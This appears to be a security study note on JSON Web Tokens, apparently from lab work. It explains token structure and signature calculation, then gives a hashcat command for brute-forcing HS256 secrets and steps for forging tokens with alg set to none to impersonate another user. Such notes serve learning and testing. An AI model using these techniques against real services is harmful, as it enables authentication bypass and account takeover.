### JWT 
JWTs are typically comprised of three sections: header, payload, and signature. The sections of a JWT are independently-encoded using Base64URL and concatenated using a period (.) as a separator  
>We need to note that Base64URL is slightly different than Base64, as it tries to avoid characters such as =, /, and +, which would be problematic if they were part of a URL.

![image](https://github.com/KiritoLoveAsuna/WebApplicationSecurity/assets/38044499/9ca79357-5ed1-4b29-b6c4-068fd252008a)

### Calculation of Signature with symmetric key
```
import hashlib
import hmac
import base64
jwt_header="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
jwt_payload="eyJzdWIiOiJzdHVkZW50IiwibmFtZSI6IlN0dWRlbnQiLCJpYXQiOjE1MTYyMzkwMjJ9"
key="studentlab"
message = jwt_header + "." + jwt_payload
signature = hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip("=")
print(signature_encoded)
```
### symmetric cryptography algorithms
```
Hash-based Message Authentication Code (HMAC) using SHA-256 hashing algorithm (HS256)
HMACs with SHA-384 (HS384) or SHA-512 (HS512)
```
### Brute-force HS256 JWT token
```
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/seclists/Passwords/scraped-JWT-secrets.txt -O
```
### Asymmetric cryptography algorithms
```
RSA (RS256)
Elliptic Curves (ES256)
```
### Obtaining public key 
https://{yourDomain}/.well-known/jwks.json

### transfer to pem from jwks
```
python3 generate_pem_from_jwks.py "http://api-sandbox/.well-known/jwks.json"

result:
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqeo5e7UglzqFjdH48hsk
lNFjTqpJ5qTqz0VIn2BWRfMSkWorpgv46nr9spmzKGzxtGEG25r0nki3R1KaTmtI
lslh+C7d6FYH/7kCASeJsy27btWI1j4xyheaC5XNdxjJRg5XS8D9cZaT8/FdnkrF
1pJHs1IJVFdHsEmK5VB6YtiYKNyor6PUxpB4UyjxyeamD3rV8Plp2efjmX367d2y
9rJLyazJPC/uc4FjvB/v3ZDLlOTVF2tOlh6QDQFYBzeGSZaaK6m/qmAPiYgP0sCV
HsoxoKa53VSuy1YDGKSB0Y/g5Br5dQwN0YXA7xBz7xB2OAJ//tcqoHFC3QMa7pb1
0QIDAQAB
-----END PUBLIC KEY-----
```
### Impersonating user of JWT token without signature
```
1.change alg to none
2.change role and sub to other user
3. header.payload. = token
```
